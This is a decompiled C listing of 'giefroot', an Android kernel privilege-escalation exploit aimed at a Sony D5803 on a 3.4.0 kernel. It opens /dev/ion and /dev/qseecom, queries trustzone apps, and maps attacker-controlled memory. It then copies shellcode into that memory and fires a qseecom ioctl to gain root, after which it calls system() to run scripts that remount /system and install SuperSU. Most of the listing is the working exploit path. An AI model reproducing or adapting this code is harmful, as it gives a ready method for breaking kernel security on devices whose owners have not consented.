/* This file has been generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2012 Hex-Rays <info@hex-rays.com>

   Detected compiler: GNU C++
*/

#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

// int __fastcall _libc_init(_DWORD, _DWORD, _DWORD, _DWORD); weak
// int memcmp(const void *, const void *, size_t);
// void *memcpy(void *, const void *, size_t);
// int __fastcall ioctl(_DWORD, _DWORD, _DWORD); weak
// int puts(const char *);
// int strcmp(const char *, const char *);
// int __fastcall _stack_chk_fail(_DWORD); weak
// FILE *fopen(const char *, const char *);
// void *malloc(size_t);
// size_t fread(void *, size_t, size_t, FILE *);
// int fclose(FILE *);
// char *strchr(const char *, int);
// void *memset(void *, int, size_t);
// char *fgets(char *, int, FILE *);
// int strncmp(const char *, const char *, size_t);
// void free(void *);
// int printf(const char *, ...);
// char *strncpy(char *, const char *, size_t);
// int __fastcall strnlen(_DWORD, _DWORD); weak
// size_t strlen(const char *);
// int __fastcall open(_DWORD, _DWORD); weak
// int fsync(void); weak
// int __fastcall close(_DWORD); weak
// size_t fwrite(const void *, size_t, size_t, FILE *);
// int __fastcall mmap(_DWORD, _DWORD, _DWORD, _DWORD); weak
// int __fastcall munmap(_DWORD, _DWORD); weak
// int __fastcall getuid(_DWORD); weak
// int system(const char *);
// __int32 strtol(const char *, char **, int);
// int __fastcall _gnu_Unwind_Find_exidx(_DWORD, _DWORD); weak
// void abort(void);
// int __fastcall _cxa_begin_cleanup(_DWORD); weak
// int __fastcall _cxa_type_match(_DWORD, _DWORD, _DWORD, _DWORD); weak
int __fastcall start(int a1, int a2, int a3, int a4, int a5);
signed int __fastcall sub_89F8();
void __fastcall sub_8A48();
int __fastcall sub_8A54(int result);
int __fastcall sub_8A68(int a1, int a2);
unsigned int __fastcall sub_8ACC(int a1, unsigned int a2);
int __fastcall sub_8B34(int a1, int a2);
int __fastcall sub_8B44(int a1, int a2);
signed int __fastcall sub_8B54(int a1);
int __fastcall sub_8CD0();
void *__fastcall sub_8CD8();
void *__fastcall sub_8D5C();
char **__fastcall sub_8EE8(const char *a1, const char *a2);
signed int __fastcall sub_8F78();
int __fastcall sub_8FC4(signed int a1, int a2);
int __fastcall sub_9A74(int a1);
int __fastcall sub_9A8C(int a1, int a2);
void __fastcall sub_9C60(__int64 a1);
signed int __fastcall sub_9CCC(int a1, int a2, int a3);
signed int __fastcall sub_9DE0(int a1, int a2, int a3, int a4, unsigned int a5);
signed int __fastcall sub_9E38(int a1, unsigned int a2, unsigned int a3, int a4, unsigned int a5);
int __fastcall sub_9E7C(int a1, unsigned int a2, int a3, int a4);
signed int __fastcall sub_9EA4(signed int result, unsigned int a2, unsigned int a3, int a4, unsigned int a5);
signed int __fastcall sub_9EE8(signed int a1, unsigned int a2, int a3);
signed int __fastcall sub_9F14(char a1, int a2, int a3, int a4);
signed int __fastcall sub_A2A8(char a1, int a2, int a3);
signed int __fastcall sub_A2B0(char a1, int a2, int a3);
signed int __fastcall sub_A2B8(char a1, int a2, int a3);
signed int __fastcall sub_A2C0(int a1, int a2, unsigned int a3, int a4);
signed int __fastcall sub_A620(int a1, int a2);
signed int __fastcall sub_A6C4(int a1, int a2, int a3, int a4);
void __fastcall sub_A6E0(int a1, int a2, int a3, unsigned int a4);
signed int __fastcall sub_A74C(int a1, int a2);
signed int __fastcall sub_A790(int (__fastcall *a1)(_DWORD, _DWORD), int a2, int a3);
void __fastcall sub_A850();
int __fastcall sub_A864(__int64 _R0);
__int64 __fastcall sub_A86C();
int __fastcall sub_A874(__int64 _R0);
__int64 __fastcall sub_A87C();
void __fastcall sub_A884();
void __fastcall sub_A88C();
int __fastcall sub_A894(int a1);
void __fastcall sub_A8D8();
int __fastcall sub_A91C(int a1);
void __fastcall sub_A930();
signed int __fastcall sub_A9F8(int a1);
signed int __fastcall sub_AA50(int a1, int a2, int a3, int a4);

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN sub_89F0; // weak
_UNKNOWN unk_B038; // weak
_UNKNOWN unk_DDFC; // weak
_UNKNOWN unk_DE04; // weak
_UNKNOWN unk_DE0C; // weak
_UNKNOWN unk_DE14; // weak
int GLOBAL_OFFSET_TABLE_[] = { 0 }; // weak
_UNKNOWN unk_E000; // weak
_UNKNOWN unk_E004; // weak
int dword_E008 = 4294967295; // idb
char *off_E00C[2] =
{
  "Linux version 3.4.0-perf-g0961cdf (BuildUser@BuildHost) (gcc version 4.7 (GCC) ) #1 SMP PREEMPT Tue Aug 19 19:48:36 2014",
  "D5803"
}; // weak
_UNKNOWN unk_E020; // weak
_UNKNOWN unk_E18C; // weak
_UNKNOWN unk_E190; // weak
_UNKNOWN unk_E194; // weak
// extern _UNKNOWN _stack_chk_guard; weak
_UNKNOWN __gnu_Unwind_Find_exidx; // weak
// extern _UNKNOWN _cxa_call_unexpected; weak


//----- (00008960) --------------------------------------------------------
int __fastcall start(int a1, int a2, int a3, int a4, int a5)
{
  int v6; // [sp+0h] [bp-14h]@1
  int v7; // [sp+4h] [bp-10h]@1
  int v8; // [sp+8h] [bp-Ch]@1
  int v9; // [sp+Ch] [bp-8h]@1

  v6 = (int)&unk_DE0C;
  v7 = (int)&unk_DE04;
  v8 = (int)&unk_DDFC;
  v9 = (int)&unk_DE14;
  return _libc_init(&a5, 0, sub_8FC4, &v6);
}
// 87C8: using guessed type int __fastcall _libc_init(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (000089F8) --------------------------------------------------------
signed int __fastcall sub_89F8()
{
  void (__fastcall *v0)(_DWORD); // r4@1
  int (__fastcall *v1)(_DWORD); // r3@1
  int v2; // r0@1

  v1 = *(int (__fastcall **)(_DWORD))(unk_E18C + 16);
  unk_E190 = *(_DWORD *)(unk_E18C + 12);
  v0 = (void (__fastcall *)(_DWORD))unk_E190;
  unk_E194 = v1;
  v2 = v1(0);
  v0(v2);
  return -22;
}

//----- (00008A48) --------------------------------------------------------
void __fastcall sub_8A48()
{
  ;
}

//----- (00008A54) --------------------------------------------------------
int __fastcall sub_8A54(int result)
{
  *(_DWORD *)(result + 4) = sub_89F8;
  return result;
}

//----- (00008A68) --------------------------------------------------------
int __fastcall sub_8A68(int a1, int a2)
{
  int v2; // r7@1
  int v3; // r6@1
  int result; // r0@2
  unsigned int v5; // r5@3
  unsigned int v6; // r4@3
  const void *v7; // r5@5
  int v8; // [sp+4h] [bp-1Ch]@1

  v2 = a2 - 4;
  v3 = a1;
  v8 = -1;
  if ( a2 == 4 )
  {
    result = a2 - 4;
  }
  else
  {
    v5 = 0;
    v6 = 0;
    while ( 1 )
    {
      v7 = (const void *)(v3 + v5);
      result = memcmp(v7, &v8, 4u);
      v6 += 4;
      if ( result )
        break;
      v5 = v6;
      if ( v6 >= v2 )
        return result;
    }
    result = (int)v7;
  }
  return result;
}

//----- (00008ACC) --------------------------------------------------------
unsigned int __fastcall sub_8ACC(int a1, unsigned int a2)
{
  unsigned int v2; // r5@1
  int v3; // r6@1
  unsigned int v4; // r4@2
  unsigned int v5; // r0@3
  char v7; // [sp+4h] [bp-14h]@1

  v2 = a2;
  v3 = a1;
  memcpy(&v7, &unk_B038, 4u);
  if ( v2 )
  {
    v5 = 0;
    v4 = 0;
    do
    {
      v4 += 4;
      memcpy((void *)(v3 + v5), &v7, 4u);
      v5 = v4;
    }
    while ( v4 < v2 );
  }
  else
  {
    v4 = 0;
  }
  return v4;
}

//----- (00008B34) --------------------------------------------------------
int __fastcall sub_8B34(int a1, int a2)
{
  return ioctl(a1, -1070557436, a2);
}
// 87F8: using guessed type int __fastcall ioctl(_DWORD, _DWORD, _DWORD);

//----- (00008B44) --------------------------------------------------------
int __fastcall sub_8B44(int a1, int a2)
{
  return ioctl(a1, -1072412416, a2);
}
// 87F8: using guessed type int __fastcall ioctl(_DWORD, _DWORD, _DWORD);

//----- (00008B54) --------------------------------------------------------
signed int __fastcall sub_8B54(int a1)
{
  int v1; // r4@1
  signed int result; // r0@7
  int v3; // [sp+0h] [bp-68h]@1
  int v4; // [sp+4h] [bp-64h]@1
  int v5; // [sp+8h] [bp-60h]@1
  int v6; // [sp+Ch] [bp-5Ch]@1
  int v7; // [sp+10h] [bp-58h]@1
  int v8; // [sp+14h] [bp-54h]@1
  int v9; // [sp+18h] [bp-50h]@1
  int v10; // [sp+1Ch] [bp-4Ch]@1
  int v11; // [sp+20h] [bp-48h]@2
  int v12; // [sp+24h] [bp-44h]@2
  int v13; // [sp+28h] [bp-40h]@2
  int v14; // [sp+2Ch] [bp-3Ch]@2
  int v15; // [sp+30h] [bp-38h]@2
  int v16; // [sp+34h] [bp-34h]@2
  int v17; // [sp+38h] [bp-30h]@2
  int v18; // [sp+3Ch] [bp-2Ch]@2
  int v19; // [sp+44h] [bp-24h]@1

  v1 = a1;
  v19 = _stack_chk_guard;
  v3 = 1836672363;
  v4 = 1702130529;
  v5 = 114;
  v6 = 0;
  v7 = 0;
  v8 = 0;
  v9 = 0;
  v10 = 0;
  while ( 1 )
  {
    while ( 1 )
    {
      v11 = v3;
      v12 = v4;
      v13 = v5;
      v14 = v6;
      v15 = v7;
      v16 = v8;
      v17 = v9;
      v18 = v10;
      if ( ioctl(v1, -1071343857, &v11) )
      {
        result = 0;
        goto LABEL_8;
      }
      puts("query failed. trying another app...");
      if ( strcmp((const char *)&v3, "keymaster") )
        break;
      v3 = 1769437812;
      v4 = 1769366884;
      LOWORD(v5) = 'en';
      BYTE2(v5) = 0;
    }
    if ( strcmp((const char *)&v3, "tzwidevine") )
      break;
    v3 = 1970502260;
    v4 = 1919906926;
    LOWORD(v5) = 121;
  }
  if ( !strcmp((const char *)&v3, "tzsuntory") )
  {
    puts("Error querying app");
    result = 1;
  }
  else
  {
    result = 0;
  }
LABEL_8:
  if ( v19 != _stack_chk_guard )
    _stack_chk_fail(result);
  return result;
}
// 87F8: using guessed type int __fastcall ioctl(_DWORD, _DWORD, _DWORD);
// 881C: using guessed type int __fastcall _stack_chk_fail(_DWORD);

//----- (00008CD0) --------------------------------------------------------
int __fastcall sub_8CD0()
{
  return 0;
}

//----- (00008CD8) --------------------------------------------------------
void *__fastcall sub_8CD8()
{
  FILE *v0; // r5@1
  void *v1; // r4@2
  char *v2; // r0@2

  v0 = fopen("/proc/version", "r");
  if ( v0 )
  {
    v1 = malloc(0x100u);
    fread(v1, 0x100u, 1u, v0);
    fclose(v0);
    v2 = strchr((const char *)v1, 10);
    if ( v2 )
      *v2 = 0;
  }
  else
  {
    v1 = 0;
    puts("Error: Could not open /proc/version");
  }
  return v1;
}

//----- (00008D5C) --------------------------------------------------------
void *__fastcall sub_8D5C()
{
  void *v0; // r8@1
  void *v1; // r0@1
  char v2; // zf@1
  void *v3; // r5@3
  int v4; // r4@4
  FILE *v5; // r0@4
  FILE *v6; // r6@6
  int v7; // r0@8
  char v8; // r10@8
  void *result; // r0@5

  v0 = malloc(0x20u);
  v1 = malloc(0x100u);
  v2 = v0 == 0;
  if ( v0 )
    v2 = v1 == 0;
  v3 = v1;
  if ( v2 )
  {
    puts("Error: Could not allocate memory for device name");
    result = 0;
  }
  else
  {
    v4 = 0;
    memset(v1, 0, 0x100u);
    *(_DWORD *)v0 = 0;
    *((_DWORD *)v0 + 1) = 0;
    *((_DWORD *)v0 + 2) = 0;
    *((_DWORD *)v0 + 3) = 0;
    *((_DWORD *)v0 + 4) = 0;
    *((_DWORD *)v0 + 5) = 0;
    *((_DWORD *)v0 + 6) = 0;
    *((_DWORD *)v0 + 7) = 0;
    v5 = fopen("/system/build.prop", "rb");
    v6 = v5;
    if ( v5 )
    {
      while ( 1 )
      {
        if ( !fgets((char *)v3, 256, v6) )
        {
          printf("Error: Could not read line %d in build.prop", v4, 18);
          free(v0);
          v0 = 0;
          goto LABEL_10;
        }
        v7 = strncmp((const char *)v3, "ro.product.device=", 0x12u);
        v8 = v7;
        ++v4;
        if ( !v7 )
          break;
        if ( v4 == 30 )
          goto LABEL_10;
      }
      strncpy((char *)v0, (const char *)v3 + 18, 0x20u);
      *((_BYTE *)v0 + strnlen(v0, 32) - 1) = v8;
LABEL_10:
      fclose(v6);
      free(v3);
      sub_8A48();
    }
    else
    {
      puts("Error: Could not open build.prop");
      free(v3);
      free(v0);
      v0 = (void *)v6;
    }
    result = v0;
  }
  return result;
}
// 88AC: using guessed type int __fastcall strnlen(_DWORD, _DWORD);

//----- (00008EE8) --------------------------------------------------------
char **__fastcall sub_8EE8(const char *a1, const char *a2)
{
  const char *v2; // r6@1
  const char *v3; // r7@1
  const char *v4; // r11@1
  char **v5; // r8@2
  _UNKNOWN *v6; // r4@3
  int v7; // r5@3
  size_t v8; // r0@4
  const char *v9; // t1@8

  v2 = a1;
  v3 = a2;
  v4 = off_E00C[0];
  if ( off_E00C[0] )
  {
    v5 = 0;
    v6 = &unk_E020;
    v7 = 0;
    do
    {
      v8 = strlen(v4);
      if ( !strncmp(v4, v2, v8) && (!v5 || !strcmp(*((const char **)v6 - 4), v3)) )
        v5 = &off_E00C[5 * v7];
      v9 = *(const char **)v6;
      v6 = (char *)v6 + 20;
      v4 = v9;
      ++v7;
    }
    while ( v9 );
  }
  else
  {
    v5 = (char **)off_E00C[0];
  }
  return v5;
}
// E00C: using guessed type char *off_E00C[2];

//----- (00008F78) --------------------------------------------------------
signed int __fastcall sub_8F78()
{
  int v0; // r4@1
  signed int result; // r0@2

  v0 = open("/dev/ptmx", 0);
  if ( v0 <= 0 )
  {
    puts("Error opening ptmx device");
    result = 1;
  }
  else
  {
    fsync();
    close(v0);
    result = 0;
  }
  return result;
}
// 88C4: using guessed type int __fastcall open(_DWORD, _DWORD);
// 88D0: using guessed type int fsync(void);
// 88DC: using guessed type int __fastcall close(_DWORD);

//----- (00008FC4) --------------------------------------------------------
int __fastcall sub_8FC4(signed int a1, int a2)
{
  signed int v2; // r4@1
  int v3; // r5@1
  FILE *v4; // r6@1
  void *v5; // r7@3
  void *v6; // r0@3
  char v7; // zf@3
  void *v8; // r6@5
  int result; // r0@6
  int v10; // r9@10
  signed int v11; // r10@10
  const char *v12; // t1@11
  signed int v13; // r10@13
  const char *v14; // r6@17
  __int32 v15; // r5@21
  int v16; // r4@22
  int v17; // r6@24
  void *v18; // r7@27
  int v19; // r10@29
  int v20; // r5@32
  unsigned int v21; // r3@35
  int v22; // r11@42
  unsigned int v23; // r0@44
  unsigned int v24; // r10@45
  int v25; // r0@46
  int v26; // r10@46
  int v27; // r10@47
  unsigned int v28; // r7@47
  int v29; // r5@47
  int v30; // r7@47
  const char *v31; // r0@47
  int v32; // r0@50
  int v33; // r0@50
  int v34; // r0@50
  char **v35; // r3@52
  char *v36; // r1@52
  int v37; // r0@43
  int v38; // r11@63
  signed int v39; // r10@64
  int v40; // r2@66
  void *v41; // r0@69
  int v42; // r10@69
  unsigned int v43; // r3@70
  int v44; // r0@71
  int v45; // r10@71
  int v46; // r10@72
  unsigned int v47; // r7@72
  int v48; // r0@73
  int v49; // [sp+28h] [bp-80h]@27
  int v50; // [sp+2Ch] [bp-7Ch]@32
  int v51; // [sp+30h] [bp-78h]@32
  int v52; // [sp+34h] [bp-74h]@32
  int v53; // [sp+38h] [bp-70h]@32
  int v54; // [sp+3Ch] [bp-6Ch]@23
  int v55; // [sp+40h] [bp-68h]@23
  int v56; // [sp+44h] [bp-64h]@23
  int v57; // [sp+48h] [bp-60h]@23
  int v58; // [sp+4Ch] [bp-5Ch]@23
  int v59; // [sp+50h] [bp-58h]@33
  int v60; // [sp+54h] [bp-54h]@33
  int v61; // [sp+58h] [bp-50h]@33
  int v62; // [sp+5Ch] [bp-4Ch]@33
  int v63; // [sp+60h] [bp-48h]@33
  unsigned int v64; // [sp+64h] [bp-44h]@33
  int v65; // [sp+68h] [bp-40h]@33
  int v66; // [sp+6Ch] [bp-3Ch]@33
  int v67; // [sp+70h] [bp-38h]@33
  int v68; // [sp+74h] [bp-34h]@33
  int v69; // [sp+78h] [bp-30h]@33
  int v70; // [sp+7Ch] [bp-2Ch]@33

  v2 = a1;
  v3 = a2;
  puts("giefroot (c) zxz0O0");
  v4 = fopen("/dev/null", "w");
  if ( v4 )
  {
    fwrite("munjeni, stop copying my code\n", 1u, 0x1Eu, v4);
    fclose(v4);
  }
  v5 = sub_8CD8();
  v6 = sub_8D5C();
  v7 = v5 == 0;
  if ( v5 )
    v7 = v6 == 0;
  v8 = v6;
  if ( v7 )
    return 1;
  unk_E18C = sub_8EE8((const char *)v5, (const char *)v6);
  if ( v2 > 1 )
  {
    v10 = v3;
    v11 = 1;
    while ( 1 )
    {
      v12 = *(const char **)(v10 + 4);
      v10 += 4;
      if ( !strcmp(v12, "-f") )
        break;
      ++v11;
      if ( v11 == v2 )
        goto LABEL_13;
    }
    v35 = &off_E00C[5 * strtol(*(const char **)(v3 + 4 * (v11 + 1)), 0, 0)];
    v36 = v35[1];
    unk_E18C = v35;
    printf("Forced to use offsets for %s\n", v36);
  }
LABEL_13:
  sub_8A48();
  v13 = unk_E18C;
  if ( unk_E18C )
  {
    v13 = 1;
  }
  else
  {
    puts("Error: Kernel not supported");
    printf("Device: %s, Kernel: %s\n", v8, v5);
    unk_E18C = off_E00C;
  }
  free(v5);
  free(v8);
  if ( v2 <= 1 )
    goto LABEL_82;
  v14 = *(const char **)(v3 + 4);
  if ( !strcmp(*(const char **)(v3 + 4), "-s") )
    return v13 ^ 1;
  if ( v2 == 3 && !strcmp(v14, "-a") )
    v15 = strtol(*(const char **)(v3 + 8), 0, 0);
  else
LABEL_82:
    v15 = 1;
  v16 = open("/dev/ion", 0);
  if ( v16 < 0 )
  {
    puts("Error opening ion device");
    result = 1;
  }
  else
  {
    while ( 1 )
    {
      v54 = 256;
      v55 = 4096;
      v56 = 134217728;
      v57 = 1;
      v58 = -1;
      sub_8A48();
      sub_8A48();
      if ( v15 > 0 )
      {
        v17 = 0;
        do
        {
          ++v17;
          sub_8B44(v16, (int)&v54);
        }
        while ( v17 != v15 );
      }
      if ( v58 == -1 )
      {
        puts("Error: Could not allocate ION Memory");
        return 1;
      }
      v49 = v58;
      ioctl(v16, -1073198844, &v49);
      v18 = (void *)mmap(0, 256, 7, 1);
      if ( v18 == (void *)-1 )
        puts("Failed to share ionmem");
      memset(v18, 255, 0x100u);
      unk_E004 = open("/data/local/tmp/memfile", 2);
      if ( unk_E004 < 0 )
        puts("Error opening memfile");
      v19 = mmap(0, 2113929216, 7, 1);
      if ( v19 == -1 )
      {
        puts("mmap shared_buf failed");
        sub_8A48();
        close(unk_E004);
        close(v16);
        return 1;
      }
      dword_E008 = open("/dev/qseecom", 0);
      if ( dword_E008 < 0 )
      {
        puts("Error opening qseecom");
        goto LABEL_50;
      }
      sub_8A48();
      if ( sub_8B54(dword_E008) )
        goto LABEL_50;
      v51 = v50;
      v53 = 2113929216;
      v52 = v19;
      ioctl(dword_E008, -1072916728, &v51);
      munmap(v19, 2113929216);
      v20 = mmap(v19, 4096, 7, 50);
      if ( v20 == -1 )
        puts("Error allocating shared buf again");
      memset((void *)v20, 255, 0x1000u);
      v60 = 2113921024;
      v62 = 2113921024;
      v63 = v50;
      v65 = 1337;
      v59 = v20;
      v61 = v20;
      v64 = 0;
      v66 = 0;
      v68 = 0;
      v67 = 0;
      v70 = 0;
      v69 = 0;
      puts("getting ptr");
      sub_8B34(dword_E008, (int)&v59);
      if ( *(_DWORD *)v20 != -1 )
      {
        puts("Seems device is not mapping to kernel space");
        *(_DWORD *)v18 = *(_DWORD *)v20;
        unk_E000 = 0;
      }
      munmap(v20, 4096);
      v21 = *(_DWORD *)v18;
      if ( *(_DWORD *)v18 == -1 )
      {
        puts("Error: ionmem is unchanged");
        goto LABEL_50;
      }
      if ( v21 <= 0xB0000000 || v21 << 8 <= 0xB0000000 || v21 << 16 <= 0xB0000000 )
        break;
      v15 = 3;
      puts("Error: get to the choppa");
      munmap(v18, 256);
      close(dword_E008);
    }
    if ( unk_E000 )
    {
      v37 = mmap(v19, 61865984, 7, 49);
      v38 = v37;
      if ( v37 == -1 )
      {
        puts("Need to lower testmemsize");
        if ( mmap(v19, 4194304, 7, 49) == -1 )
        {
          puts("Error allocating testmem");
          sub_8CD0();
          return 1;
        }
        v39 = 4194304;
      }
      else
      {
        v39 = 61865984;
      }
      memset((void *)v38, 255, v39);
      v59 = v20 + ((unsigned int)(v38 + 979369984) >> 1);
      v64 = (unsigned int)(v38 + 979369984) >> 1;
      puts("getting offset");
      sub_8A48();
      sub_8A48();
      sub_8B34(dword_E008, (int)&v59);
      v40 = sub_8A68(v38, v39);
      if ( !v40 )
      {
        puts("Error getting offset");
        munmap(v38, v39);
        goto LABEL_50;
      }
      v48 = v38;
      v22 = -979369984 - v38 + v40;
      munmap(v48, v39);
    }
    else
    {
      v22 = v20;
    }
    v23 = *(_DWORD *)v18;
    if ( *(_DWORD *)v18 <= 0xB0000000u )
    {
      v41 = (void *)mmap(v23, 1024, 7, 49);
      v42 = (int)v41;
      if ( v41 == (void *)-1 )
      {
        puts("Error: Could not allocate memory for exploit code");
      }
      else
      {
        memcpy(v41, &sub_89F0, 0x400u);
        munmap(v18, 256);
        sub_8A54(v42);
        v43 = (unsigned int)(*(_DWORD *)(unk_E18C + 8) + 56 - v22) >> 1;
        v59 = v20 + v43;
        v64 = v43;
        puts("exploiting");
        sub_8B34(dword_E008, (int)&v59);
      }
      goto LABEL_49;
    }
    v24 = v23 << 8;
    if ( v23 << 8 <= 0xB0000000 )
    {
      v25 = mmap(v23 << 8, 1024, 7, 49);
      v26 = v25;
      if ( v25 == -1 )
      {
        puts("Error: Could not allocate memory for exploit code (Variant 2)");
        sub_8CD0();
        goto LABEL_50;
      }
      sub_8ACC(v25, 0x100u);
      v27 = v26 + 256;
      memcpy((void *)v27, &sub_89F0, 0x300u);
      munmap(v18, 256);
      sub_8A54(v27);
      v28 = (unsigned int)(*(_DWORD *)(unk_E18C + 8) + 56 - v22) >> 1;
      sub_8A48();
      v29 = v20 + v28;
      v30 = v28 + 1;
      v31 = "exploiting (Variant 2)";
LABEL_48:
      v59 = v29;
      v64 = v30;
      puts(v31);
      sub_8B34(dword_E008, (int)&v59);
LABEL_49:
      puts("getting root...");
      sub_8F78();
      goto LABEL_50;
    }
    sub_8A48();
    if ( v24 << 8 <= 0xB0000000 )
    {
      v44 = mmap(v24 << 8, 65792, 7, 49);
      v45 = v44;
      if ( v44 == -1 )
      {
        puts("Error: Could not allocate memory for exploit code (Variant 2.2)");
        goto LABEL_50;
      }
      sub_8ACC(v44, 0x10100u);
      v46 = v45 + 65536;
      memcpy((void *)v46, &sub_89F0, 0x100u);
      munmap(v18, 256);
      sub_8A54(v46);
      v47 = (unsigned int)(*(_DWORD *)(unk_E18C + 8) + 56 - v22) >> 1;
      sub_8A48();
      v29 = v20 + v47;
      v30 = v47 + 2;
      v31 = "exploiting (Variant 2.2)";
      goto LABEL_48;
    }
    printf("Error: newad is in kernel space (%d) (Variant 2.2)\n", v24 << 8);
LABEL_50:
    close(dword_E008);
    close(v16);
    v32 = close(unk_E004);
    v33 = getuid(v32);
    v34 = printf("getuid: %d\n", v33);
    if ( getuid(v34) )
    {
      puts("Error getting root");
      result = 1;
    }
    else
    {
      system("echo '' >> /data/local/tmp/giefrootlog");
      system("/data/local/tmp/systemrw.sh >> /data/local/tmp/giefrootlog");
      system("/data/local/tmp/installsupersu.sh >> /data/local/tmp/giefrootlog");
      result = 0;
    }
  }
  return result;
}
// 87F8: using guessed type int __fastcall ioctl(_DWORD, _DWORD, _DWORD);
// 88C4: using guessed type int __fastcall open(_DWORD, _DWORD);
// 88DC: using guessed type int __fastcall close(_DWORD);
// 88F4: using guessed type int __fastcall mmap(_DWORD, _DWORD, _DWORD, _DWORD);
// 8900: using guessed type int __fastcall munmap(_DWORD, _DWORD);
// 890C: using guessed type int __fastcall getuid(_DWORD);
// E00C: using guessed type char *off_E00C[2];

//----- (00009A74) --------------------------------------------------------
int __fastcall sub_9A74(int a1)
{
  int v1; // r3@1
  int v2; // r3@2

  v1 = *(_DWORD *)a1;
  if ( *(_DWORD *)a1 & 0x40000000 )
    v2 = v1 | 0x80000000;
  else
    v2 = v1 & 0x7FFFFFFF;
  return a1 + v2;
}

//----- (00009A8C) --------------------------------------------------------
int __fastcall sub_9A8C(int a1, int a2)
{
  int v2; // r4@1
  int v3; // r6@1
  int result; // r0@2
  signed int v5; // r9@2
  int v6; // r11@6
  int v7; // r10@6
  int v8; // r7@7
  int v9; // r8@7
  int v10; // r0@7
  int v11; // r3@7
  int v12; // r0@8
  int v13; // ST00_4@9
  int v14; // r0@9
  int v15; // r0@19
  int v16; // r3@19
  char v17; // zf@19
  int v18; // r0@23
  signed int v19; // r3@24
  int v20; // r0@25
  int v21; // r0@26
  int v22; // r3@27
  signed int v23; // r3@30
  int v24; // [sp+4h] [bp-34h]@6
  int v25; // [sp+Ch] [bp-2Ch]@2

  v2 = a1;
  v3 = a2 - 2;
  if ( &__gnu_Unwind_Find_exidx )
  {
    result = _gnu_Unwind_Find_exidx(a2 - 2, &v25);
    v5 = result;
    if ( !result )
      goto LABEL_34;
  }
  else
  {
    v5 = 44720;
    v25 = (signed int)0x140u >> 3;
  }
  if ( !v25 )
    goto LABEL_17;
  v6 = v25 - 1;
  v7 = 0;
  v24 = v25 - 1;
  while ( 1 )
  {
    while ( 1 )
    {
      v8 = (v7 + v6) / 2;
      v9 = v5 + 8 * v8;
      v10 = sub_9A74(v5 + 8 * v8);
      v11 = v10;
      if ( v8 == v24 )
      {
        v12 = -1;
      }
      else
      {
        v13 = v10;
        v14 = sub_9A74(v5 + 8 * (v8 + 1));
        v11 = v13;
        v12 = v14 - 1;
      }
      if ( v3 >= (unsigned int)v11 )
        break;
      if ( v8 == v7 )
        goto LABEL_17;
      v6 = v8 - 1;
    }
    if ( v3 <= (unsigned int)v12 )
      break;
    v7 = v8 + 1;
  }
  if ( !v9 )
  {
LABEL_17:
    *(_DWORD *)(v2 + 16) = 0;
    return 9;
  }
  v15 = sub_9A74(v5 + 8 * v8);
  v16 = *(_DWORD *)(v9 + 4);
  v17 = v16 == 1;
  if ( v16 == 1 )
  {
    v16 = 0;
    *(_DWORD *)(v2 + 16) = 0;
  }
  *(_DWORD *)(v2 + 72) = v15;
  if ( v17 )
  {
    result = 5;
  }
  else
  {
    v18 = v9 + 4;
    if ( v16 >= 0 )
    {
      v20 = sub_9A74(v18);
      v19 = 0;
      *(_DWORD *)(v2 + 76) = v20;
    }
    else
    {
      *(_DWORD *)(v2 + 76) = v18;
      v19 = 1;
    }
    v21 = *(_DWORD *)(v2 + 76);
    *(_DWORD *)(v2 + 80) = v19;
    if ( *(_DWORD *)v21 >= 0 )
    {
      *(_DWORD *)(v2 + 16) = sub_9A74(v21);
      result = 0;
    }
    else
    {
      v22 = (*(_DWORD *)v21 >> 24) & 0xF;
      if ( (*(_DWORD *)v21 >> 24) & 0xF )
      {
        result = 0;
        if ( v22 == 1 )
        {
          v23 = -3;
        }
        else
        {
          if ( v22 != 2 )
          {
LABEL_34:
            *(_DWORD *)(v2 + 16) = result;
            return 9;
          }
          v23 = -2;
        }
        *(_DWORD *)(v2 + 16) = GLOBAL_OFFSET_TABLE_[v23];
      }
      else
      {
        result = 0;
        *(_DWORD *)(v2 + 16) = sub_A2B8;
      }
    }
  }
  return result;
}
// 8930: using guessed type int __fastcall _gnu_Unwind_Find_exidx(_DWORD, _DWORD);
// DF6C: using guessed type int GLOBAL_OFFSET_TABLE_[];

//----- (00009C60) --------------------------------------------------------
void __fastcall sub_9C60(__int64 a1)
{
  int v1; // r3@1
  int v2; // r4@1

  v1 = *(_DWORD *)a1;
  v2 = a1;
  if ( !(*(_DWORD *)a1 & 1) )
  {
    LODWORD(a1) = a1 + 72;
    if ( v1 & 2 )
      sub_A874(a1);
    else
      sub_A864(a1);
  }
  if ( !(*(_DWORD *)v2 & 4) )
    sub_A884();
  if ( !(*(_DWORD *)v2 & 8) )
    sub_A894(v2 + 432);
  if ( !(*(_DWORD *)v2 & 0x10) )
    sub_A91C(v2 + 560);
}

//----- (00009CCC) --------------------------------------------------------
signed int __fastcall sub_9CCC(int a1, int a2, int a3)
{
  int v3; // lr@1
  int (__fastcall *v4)(_DWORD, _DWORD, _DWORD, _DWORD); // r8@1
  int v5; // r4@1
  int v6; // r5@1
  int v7; // r0@1
  int v8; // r1@1
  int v9; // r2@1
  int v10; // r3@1
  int v11; // r0@1
  int v12; // r1@1
  int v13; // r2@1
  int v14; // r3@1
  int v15; // r0@1
  int v16; // r1@1
  int v17; // r2@1
  int v18; // r3@1
  int v19; // r1@1
  int v20; // r2@1
  int v21; // r3@1
  int v22; // r7@1
  int v23; // r0@2
  signed int v24; // r10@3
  int v25; // r3@6
  int v26; // r0@7
  int v28; // [sp+8h] [bp-4A0h]@1
  int v29; // [sp+Ch] [bp-49Ch]@1
  int v30; // [sp+10h] [bp-498h]@1
  int v31; // [sp+14h] [bp-494h]@1
  int v32; // [sp+18h] [bp-490h]@1
  int v33; // [sp+1Ch] [bp-48Ch]@1
  int v34; // [sp+20h] [bp-488h]@1
  int v35; // [sp+24h] [bp-484h]@1
  int v36; // [sp+28h] [bp-480h]@1
  int v37; // [sp+2Ch] [bp-47Ch]@1
  int v38; // [sp+30h] [bp-478h]@1
  int v39; // [sp+34h] [bp-474h]@1
  int v40; // [sp+38h] [bp-470h]@1
  int v41; // [sp+3Ch] [bp-46Ch]@1
  int v42; // [sp+40h] [bp-468h]@1
  int v43; // [sp+44h] [bp-464h]@1
  int v44; // [sp+48h] [bp-460h]@1
  int v45; // [sp+4Ch] [bp-45Ch]@8
  char v46; // [sp+248h] [bp-260h]@7
  int v47; // [sp+280h] [bp-228h]@7

  v3 = a2 + 4;
